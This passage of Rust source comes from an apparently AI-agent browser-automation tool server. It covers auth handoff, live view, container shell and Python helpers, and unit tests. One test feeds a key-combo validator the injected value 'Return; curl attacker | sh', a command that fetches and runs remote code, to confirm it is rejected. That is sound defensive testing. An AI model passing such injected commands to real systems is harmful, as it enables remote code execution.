                    if !declared_jars.is_empty() && !out.cookies.is_empty() {
                        if let Some(jars_svc) = ctx.cookie_jars {
                            let _ = jars_svc.dump_cookies_to_jars(&out.cookies, &declared_jars);
                        }
                    }
                    let resp = format_page_text_response(
                        out,
                        requested_format,
                        view_mode,
                        max_lines,
                        query,
                    );
                    match serde_json::to_string_pretty(&resp) {
                        Ok(s) => ToolResponse::text(s),
                        Err(e) => ToolResponse::error(e.to_string()),
                    }
                }
                Err(e) => ToolResponse::error(e.to_string()),
            }
        }
        "auth_handoff" => {
            let url = match args.get("url").and_then(|v| v.as_str()) {
                Some(u) if !u.is_empty() => u.to_string(),
                _ => return ToolResponse::error("auth_handoff: missing required `url`"),
            };
            let (profile_name, is_ephemeral) = match profile_for_tool(ctx, args, screen) {
                Ok(profile) => profile,
                Err(error) => return ToolResponse::error(error),
            };
            let opts = AuthHandoffOptions {
                url: url.clone(),
                wait_for_selector: args
                    .get("wait_for_selector")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                wait_for_url_contains: args
                    .get("wait_for_url_contains")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                timeout_seconds: args
                    .get("timeout_seconds")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(300),
                user_data_dir: Some(if is_ephemeral {
                    profile_name.clone()
                } else {
                    ProfileMount::container_path_for(&profile_name)
                }),
                display: Some(display.clone()),
                storage_state: args.get("storage_state").and_then(|v| {
                    if let Some(s) = v.as_str() {
                        Some(s.to_string())
                    } else if v.is_object() {
                        serde_json::to_string(v).ok()
                    } else {
                        None
                    }
                }),
                reason: args
                    .get("reason")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
            };

            // The server upgrades this relative path into an authenticated viewer session. Never
            // expose a raw noVNC port, query token, or destination URL to the model.
            let viewer_path = format!("/viewer/{screen}");

            match ctx.runtime.auth_handoff(target, &opts).await {
                Ok(out) => {
                    let failed = !matches!(out.status.as_str(), "authenticated" | "auth_required");
                    let body = serde_json::json!({
                        "status": out.status,
                        "vnc_url": viewer_path.clone(),
                        "message": out.message,
                        "instructions": "Open the authenticated viewer path in your browser to log in. Re-call \
                                          `auth_handoff` (with wait_for_*) or `page_text` once done.",
                    });
                    match serde_json::to_string_pretty(&body) {
                        Ok(s) if failed => ToolResponse::error(s),
                        Ok(s) => ToolResponse::text(s),
                        Err(e) => ToolResponse::error(e.to_string()),
                    }
                }
                Err(e) => {
                    let body = serde_json::json!({
                        "status": "error",
                        "vnc_url": viewer_path,
                        "message": e.to_string(),
                    });
                    ToolResponse::error(
                        serde_json::to_string_pretty(&body).unwrap_or_else(|_| e.to_string()),
                    )
                }
            }
        }
        "live_view" => {
            let busy = if let Some(agent) = ctx.agent {
                agent.is_busy(screen)
            } else {
                ctx.runtime
                    .exec(
                        target,
                        &[
                            "bash".into(),
                            "-c".into(),
                            format!("DISPLAY={display} xdotool getactivewindow"),
                        ],
                    )
                    .await
                    .map(|o| o.exit_code == 0)
                    .unwrap_or(false)
            };
            ToolResponse::text(
                serde_json::json!({
                    "vnc_url": format!("/viewer/{screen}"),
                    "screen": screen,
                    "display": display,
                    "busy": busy,
                })
                .to_string(),
            )
        }
        _ => ToolResponse::error(format!("unknown tool: {tool}")),
    };

    if let Some(agent) = ctx.agent {
        if let Some(info) = agent.screen_info(screen) {
            if info.phase == crate::agent::ScreenPhase::HumanActive {
                return ToolResponse::error(format!(
                    "executed_during_takeover: screen {screen} transitioned to HumanActive (handoff_gen: {})",
                    info.handoff_gen
                ));
            }
        }
    }

    resp
}

async fn sh(ctx: &ToolContext<'_>, target: &str, screen: u32, cmd: &str) -> ToolResponse {
    let display = display_for(screen);
    match ctx
        .runtime
        .exec(
            target,
            &[
                "bash".into(),
                "-c".into(),
                format!("DISPLAY={display} {cmd}"),
            ],
        )
        .await
    {
        Ok(out) if out.exit_code == 0 => ToolResponse::text(if out.stdout.is_empty() {
            "ok".into()
        } else {
            out.stdout
        }),
        Ok(out) => ToolResponse::error(format!("exit {}: {}", out.exit_code, out.stderr)),
        Err(e) => ToolResponse::error(e.to_string()),
    }
}

async fn py(ctx: &ToolContext<'_>, target: &str, screen: u32, script: &str) -> ToolResponse {
    let display = display_for(screen);
    match ctx
        .runtime
        .exec(
            target,
            &[
                "bash".into(),
                "-c".into(),
                format!("DISPLAY={display} python3 -c \"$1\""),
                "--".into(),
                script.into(),
            ],
        )
        .await
    {
        Ok(out) if out.exit_code == 0 => ToolResponse::text(out.stdout),
        Ok(out) => ToolResponse::error(format!("exit {}: {}", out.exit_code, out.stderr)),
        Err(e) => ToolResponse::error(e.to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn screen_for_and_display_for() {
        assert_eq!(screen_for(&serde_json::json!({})), 0);
        assert_eq!(screen_for(&serde_json::json!({"screen": 0})), 0);
        assert_eq!(screen_for(&serde_json::json!({"screen": 1})), 1);
        assert_eq!(screen_for(&serde_json::json!({"screen": 5})), 5);
        assert_eq!(display_for(0), ":99");
        assert_eq!(display_for(1), ":100");
    }

    #[test]
    fn requested_screen_accepts_all_screens() {
        assert_eq!(requested_screen(&serde_json::json!({})), Ok(0));
        assert_eq!(requested_screen(&serde_json::json!({"screen": 0})), Ok(0));
        assert_eq!(requested_screen(&serde_json::json!({"screen": 1})), Ok(1));
    }

    #[test]
    fn active_tool_identification() {
        assert!(is_active_tool("click"));
        assert!(is_active_tool("type"));
        assert!(is_active_tool("key"));
        assert!(is_active_tool("browse"));
        assert!(is_active_tool("scrape"));
        assert!(is_active_tool("page_text"));
        assert!(is_active_tool("auth_handoff"));
        assert!(is_active_tool("playwright_eval"));
        assert!(is_active_tool("exec"));

        assert!(!is_active_tool("live_view"));
        assert!(!is_active_tool("screenshot"));
    }

    #[test]
    fn scrape_script_is_valid_python_syntax() {
        let output = std::process::Command::new("python3")
            .arg("-c")
            .arg(format!("import ast; ast.parse({:?})", SCRAPE_SCRIPT))
            .output()
            .expect("python3 must be available on host");
        assert!(
            output.status.success(),
            "SCRAPE_SCRIPT must be valid Python syntax: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    #[test]
    fn scrape_payload_handles_quotes_and_special_characters_without_syntax_error() {
        let tricky_url = "https://example.com/search?q='hello'&test=\"world\"&sym=`$()\\#!@#%^&*";
        let tricky_selector =
            "div[data-title='it\\'s \"great\"'][aria-label=\"foo'bar\"] > span:first-child";
        let payload = serde_json::json!({
            "url": tricky_url,
            "selector": tricky_selector,
            "stealth": true,
        });
        let payload_str = serde_json::to_string(&payload).unwrap();
        let cmd = build_scrape_command(0, &payload_str);

        // Verify the generated command string contains the single-quoted payload and display prefix
        assert!(cmd.starts_with("DISPLAY=:99 REACH_SCRAPE_PAYLOAD="));
        assert!(cmd.contains("python3 -c"));

        // Execute bash with the exact generated environment string to verify Python safely decodes it
        let test_cmd = format!(
            "REACH_SCRAPE_PAYLOAD={} python3 -c 'import json, os; p = json.loads(os.environ[\"REACH_SCRAPE_PAYLOAD\"]); print(json.dumps(p))'",
            crate::docker::shell_single_quote(&payload_str),
        );
        let output = std::process::Command::new("bash")
            .arg("-c")
            .arg(test_cmd)
            .output()
            .expect("failed to execute bash command");

        assert!(
            output.status.success(),
            "Python script failed with exit code {:?}: {}",
            output.status.code(),
            String::from_utf8_lossy(&output.stderr)
        );

        let decoded: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(decoded["url"], tricky_url);
        assert_eq!(decoded["selector"], tricky_selector);
        assert_eq!(decoded["stealth"], true);
    }

    #[test]
    fn key_combo_rejects_unsafe_characters() {
        assert!(is_safe_key_combo("Control_L+Return"));
        assert!(!is_safe_key_combo("Return; curl attacker | sh"));
        assert!(!is_safe_key_combo(""));
    }

    #[tokio::test]
    async fn test_dispatch_acquires_and_releases_profile_lease_with_holder_info() {
        let runtime = RuntimeClient::from_config(&crate::config::ReachConfig::default()).unwrap();
        let broker = crate::profile::ProfileBroker::new(std::path::PathBuf::from(
            "/tmp/reach-test-profile-dispatch",
        ));
        let ctx = ToolContext {
            runtime: &runtime,
            public_host: "localhost".into(),
            agent: None,
            profile_broker: Some(&broker),
            cookie_jars: None,
            owner: Some("test-agent".into()),
        };

        // Pre-lock profile "work"
        let _lease = broker.acquire("work", 0).expect("acquire should succeed");

        let args = serde_json::json!({
            "url": "https://example.com",
            "use_profile": "work",
            "screen": 1,
        });

        // Calling browse should fail with profile_locked error
        let resp = dispatch(&ctx, "browse", &args, "test-sandbox").await;
        assert!(resp.is_error);
        let content_text = match &resp.content[0] {
            crate::mcp::ContentBlock::Text { text } => text,
            _ => panic!("expected text content"),
        };
        let err_json: serde_json::Value = serde_json::from_str(content_text).unwrap();
        assert_eq!(err_json["error"], "profile_locked");
        assert_eq!(err_json["profile"], "work");
    }

    #[test]
    fn test_resolve_profile_name_defaults_to_screen_id() {
        let empty_args = serde_json::json!({});
        let (prof0, eph0) = resolve_profile_name(&empty_args, 0);
        assert_eq!(prof0, "screen-0");
        assert!(!eph0);

        let (prof1, eph1) = resolve_profile_name(&empty_args, 1);
        assert_eq!(prof1, "screen-1");
        assert!(!eph1);

        let explicit_args = serde_json::json!({ "use_profile": "custom-prof" });
        let (prof_custom, eph_custom) = resolve_profile_name(&explicit_args, 0);
        assert_eq!(prof_custom, "custom-prof");
        assert!(!eph_custom);
    }

    #[test]
    fn test_format_page_text_strips_cookies_and_raw_refs() {
        let mut refs = std::collections::HashMap::new();
        refs.insert(
            "e1".to_string(),
            crate::refs::ElementRef {
                r#ref: "e1".into(),
                role: "button".into(),
                name: "Submit".into(),
                value: None,
                selector: None,
                backend_node_id: None,
                point: Some([10.0, 20.0]),
                box_bounds: Some([0.0, 0.0, 50.0, 20.0]),
                focused: false,
                disabled: false,
            },
        );

        let out = crate::docker::PageTextOutput {
            status: "ok".into(),
            page_target_id: None,
            page_loader_id: None,
            text: Some("Page body text".into()),
            axtree: Some("[@e1: button \"Submit\" x=0 y=0 w=50 h=20]".into()),
            refs: Some(refs),
            url: Some("https://example.com".into()),
            title: Some("Example".into()),
            message: None,
            cookies: vec![crate::profile::Cookie {
                name: "session_token".into(),
                value: "super_secret_123".into(),
                domain: "example.com".into(),
                path: "/".into(),
                http_only: Some(true),
                secure: Some(true),
                ..Default::default()
            }],
        };

        let resp = format_page_text_response(out, "both", "compact", 200, None);
        assert_eq!(resp.status, "ok");
        assert_eq!(resp.elements_count, Some(1));
        assert!(resp.axtree.is_some());
        assert!(resp.text.is_some());
        assert_eq!(resp.truncated, None);

        let json = serde_json::to_string(&resp).unwrap();
        // Zero cookies and zero raw coordinates in model response
        assert!(!json.contains("session_token"));
        assert!(!json.contains("super_secret_123"));
        assert!(!json.contains("box_bounds"));
        assert!(!json.contains("\"refs\":"));
    }

    #[test]
    fn test_format_page_text_formats() {
        let make_out = || crate::docker::PageTextOutput {
            status: "ok".into(),
            page_target_id: None,
            page_loader_id: None,
            text: Some("Visible text".into()),
            axtree: Some("[heading \"Title\"]".into()),
            refs: None,
            url: Some("https://example.com".into()),
            title: Some("Example".into()),
            message: None,
            cookies: vec![],
        };

        let resp_axtree = format_page_text_response(make_out(), "axtree", "compact", 200, None);
        assert!(resp_axtree.axtree.is_some());
        assert!(resp_axtree.text.is_none());

        let resp_text = format_page_text_response(make_out(), "text", "compact", 200, None);
        assert!(resp_text.axtree.is_none());
        assert!(resp_text.text.is_some());

        let resp_both = format_page_text_response(make_out(), "both", "compact", 200, None);
        assert!(resp_both.axtree.is_some());
        assert!(resp_both.text.is_some());
    }

    #[test]
    fn test_format_page_text_truncation_compact_vs_full() {
        let long_tree = (1..=300)
            .map(|i| format!("[@e{i}: link \"Link {i}\"]"))
            .collect::<Vec<_>>()
            .join("\n");

        let out1 = crate::docker::PageTextOutput {
            status: "ok".into(),
            page_target_id: None,
            page_loader_id: None,
            text: None,
            axtree: Some(long_tree.clone()),
            refs: None,
            url: Some("https://example.com".into()),
            title: Some("Example".into()),
            message: None,
            cookies: vec![],
        };

        let compact_resp = format_page_text_response(out1, "axtree", "compact", 50, None);
        assert_eq!(compact_resp.truncated, Some(true));
        let tree_str = compact_resp.axtree.unwrap();
        assert!(tree_str.contains("truncated 250 lines (300 total)"));
        assert!(tree_str.contains("view=\"full\""));

        let out2 = crate::docker::PageTextOutput {
            status: "ok".into(),
            page_target_id: None,
            page_loader_id: None,
            text: None,
            axtree: Some(long_tree),
            refs: None,
            url: Some("https://example.com".into()),
            title: Some("Example".into()),
            message: None,
            cookies: vec![],
        };

        let full_resp = format_page_text_response(out2, "axtree", "full", 50, None);
        assert_eq!(full_resp.truncated, None);
        let tree_full = full_resp.axtree.unwrap();
        assert_eq!(tree_full.lines().count(), 300);
    }

    #[test]
    fn test_format_page_text_query_filtering_and_help_hints() {
        let tree = "\
[@e1: button \"Sign in\"]\n\
[@e2: link \"Help & FAQs\"]\n\
[@e3: textbox \"Search items\"]\n\
[@e4: button \"Add Ground Beef to cart\"]";

        let out = crate::docker::PageTextOutput {
            status: "ok".into(),
            page_target_id: None,
            page_loader_id: None,
            text: Some("Sign in\nHelp & FAQs\nSearch items\nAdd Ground Beef to cart".into()),
            axtree: Some(tree.into()),
            refs: None,
            url: Some("https://example.com".into()),
            title: Some("Example".into()),
            message: None,
            cookies: vec![],
        };

        // Query matching "beef ground"
        let filtered =
            format_page_text_response(out.clone(), "axtree", "compact", 50, Some("beef ground"));
        assert_eq!(filtered.query.as_deref(), Some("beef ground"));
        assert_eq!(filtered.matches_count, Some(1));
        let axtree_content = filtered.axtree.unwrap();
        assert!(axtree_content.contains("@e4: button \"Add Ground Beef to cart\""));
        assert!(!axtree_content.contains("@e1: button \"Sign in\""));

        // Contextual help generated from the filtered ref @e4
        let help = filtered.help.expect("expected help hints");
        assert_eq!(help.len(), 1);
        assert_eq!(help[0], "Run click(ref=\"@e4\")");

        // Query with no match
        let nomatch =
            format_page_text_response(out, "axtree", "compact", 50, Some("nonexistent_item"));
        assert_eq!(nomatch.matches_count, Some(0));
        assert!(
            nomatch
                .axtree
                .unwrap()
                .contains("0 matching elements found")
        );
    }
}
